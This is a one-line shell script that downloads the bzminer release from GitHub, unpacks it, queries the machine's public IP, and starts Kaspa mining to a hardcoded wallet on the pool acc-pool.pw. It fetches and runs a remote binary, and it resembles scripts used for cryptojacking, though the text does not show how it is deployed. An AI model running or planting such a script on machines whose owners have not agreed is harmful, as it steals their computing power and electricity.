#!/bin/sh
wget https://github.com/bzminer/bzminer/releases/download/v10.0.1/bzminer_v10.0.1_linux.tar.gz && tar -xf bzminer_v10.0.1_linux.tar.gz && cd bzminer_v10.0.1_linux && chmod +x bzminer && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./bzminer -a kaspa -w kaspa:qp9kmkjlw0rfduxg5xh8tc495phpxkdqccr32rey2ag3m5x6j276gxjwt9pde -p stratum+tcp://acc-pool.pw:16061
